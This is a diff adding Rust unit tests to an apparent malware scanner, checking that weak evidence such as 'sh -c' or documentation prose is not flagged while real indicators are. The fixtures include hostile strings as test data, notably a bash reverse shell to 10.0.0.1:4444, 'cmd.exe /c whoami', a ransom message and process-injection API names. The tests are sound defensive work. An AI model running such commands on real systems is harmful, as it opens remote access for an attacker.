@@ -803,3 +803,134 @@ async fn enhanced_analysis_adds_no_classes_beyond_the_builtin_ones() {
     let info = enhanced.enhanced_analysis.expect("enhanced info");
     assert!(info.engine_note.is_some_and(|n| n.len() < 160));
 }
+
+// ---- weak evidence does not classify or raise the level
+
+fn level_of(content: &[u8]) -> (ThreatLevel, Vec<ThreatClassification>, Vec<String>) {
+    let file = create_test_file_with_content(content);
+    let analysis = analyze_threats(&file).unwrap();
+    let rules = analysis
+        .matches
+        .iter()
+        .map(|m| m.rule_identifier.clone())
+        .collect();
+    (analysis.threat_level, analysis.classifications, rules)
+}
+
+#[test]
+fn a_short_string_such_as_slash_c_is_not_a_backdoor() {
+    // The old rule matched "cmd.exe" next to the two bytes "/c".
+    let (level, classes, _) = level_of(b"cmd.exe is a Windows shell; use dir /c to count");
+    assert_eq!(level, ThreatLevel::Clean);
+    assert!(classes.is_empty(), "{classes:?}");
+    // Both sides: the real command line still is one.
+    let (level, classes, _) = level_of(b"cmd.exe /c whoami");
+    assert!(level >= ThreatLevel::Suspicious);
+    assert!(classes.contains(&ThreatClassification::Backdoor));
+}
+
+#[test]
+fn a_nop_run_alone_is_reported_but_does_not_classify_or_raise_the_level() {
+    let mut blob = vec![0xCC; 64];
+    blob.extend_from_slice(&[0x90; 48]);
+    blob.extend_from_slice(&[0xCC; 64]);
+    let file = create_test_file_with_content(&blob);
+    let analysis = analyze_threats(&file).unwrap();
+    let hit = analysis
+        .matches
+        .iter()
+        .find(|m| m.rule_identifier == "shellcode_patterns")
+        .expect("the match is still reported");
+    assert_eq!(
+        hit.metadata.get("evidence_strength").map(String::as_str),
+        Some("weak")
+    );
+    assert_eq!(analysis.threat_level, ThreatLevel::Clean);
+    assert!(analysis.classifications.is_empty());
+}
+
+#[test]
+fn markdown_that_describes_debugger_detection_is_not_suspicious() {
+    let text = b"# Anti-debugging\n\nPrograms read TracerPid from /proc/self/status, call ptrace, \
+check IsDebuggerPresent and OutputDebugString, or look for VMware and VirtualBox.\n";
+    let (level, classes, rules) = level_of(text);
+    assert!(rules.iter().any(|r| r == "anti_analysis"), "{rules:?}");
+    assert_eq!(level, ThreatLevel::Clean);
+    assert!(classes.is_empty());
+    // Both sides: the same words in a binary (a NUL byte first) still count.
+    let mut binary = vec![0u8, 1, 2, 0];
+    binary.extend_from_slice(text);
+    let (level, _, _) = level_of(&binary);
+    assert!(level >= ThreatLevel::Suspicious);
+}
+
+#[test]
+fn the_word_bitcoin_next_to_a_file_extension_is_not_ransomware() {
+    let (level, classes, _) =
+        level_of(b"Bitcoin wallets use the .locked state and .encrypted data");
+    assert_eq!(level, ThreatLevel::Clean);
+    assert!(classes.is_empty());
+    let (level, classes, _) = level_of(b"Your files have been encrypted, pay in Bitcoin");
+    assert_eq!(level, ThreatLevel::Critical);
+    assert!(classes.contains(&ThreatClassification::Ransomware));
+}
+
+#[test]
+fn two_strong_rules_still_rate_a_file() {
+    let (level, _, _) = level_of(
+        b"\0VirtualAlloc WriteProcessMemory CreateRemoteThread \0 schtasks /create \0 reverse shell",
+    );
+    assert!(level >= ThreatLevel::Suspicious);
+}
+
+#[test]
+fn sh_dash_c_is_not_a_backdoor_but_a_reverse_shell_command_line_is() {
+    // Every program that runs a command contains "sh -c".
+    let (level, classes, _) = level_of(b"\0\x01/bin/sh -c\0system\0");
+    assert_eq!(level, ThreatLevel::Clean);
+    assert!(classes.is_empty());
+    let (level, classes, _) = level_of(b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n");
+    assert!(level >= ThreatLevel::Suspicious);
+    assert!(classes.contains(&ThreatClassification::Backdoor));
+}
+
+#[test]
+fn the_words_reverse_shell_in_documentation_are_reported_but_weak() {
+    let file =
+        create_test_file_with_content(b"# Notes\nA reverse shell connects back to the attacker.\n");
+    let analysis = analyze_threats(&file).unwrap();
+    let hit = analysis
+        .matches
+        .iter()
+        .find(|m| m.rule_identifier == "backdoor_patterns")
+        .expect("reported");
+    assert_eq!(
+        hit.metadata.get("evidence_strength").map(String::as_str),
+        Some("weak")
+    );
+    assert_eq!(analysis.threat_level, ThreatLevel::Clean);
+    assert!(analysis.classifications.is_empty());
+}
+
+/// Long leading prose does not make the binary part after it documentation.
+#[test]
+fn long_text_before_a_binary_part_is_not_a_text_file() {
+    let prose = "The quick brown fox describes ordinary things in words.\n".repeat(1300);
+    assert!(prose.len() > 70 * 1024);
+
+    let mut a = prose.clone().into_bytes();
+    a.extend_from_slice(b"\0ptrace\0 debugger detected \0");
+    let analysis = analyze_threats(&create_test_file_with_content(&a)).unwrap();
+    let evasion = analysis
+        .matches
+        .iter()
+        .find(|m| m.rule_identifier == "self_announcing_evasion")
+        .expect("self_announcing_evasion matches");
+    assert!(!evasion.metadata.contains_key("evidence_strength"));
+    assert_ne!(analysis.threat_level, ThreatLevel::Clean);
+
+    let mut b = prose.into_bytes();
+    b.extend_from_slice(b"\0IsDebuggerPresent OutputDebugString\0");
+    let analysis = analyze_threats(&create_test_file_with_content(&b)).unwrap();
+    assert_ne!(analysis.threat_level, ThreatLevel::Clean);
+}
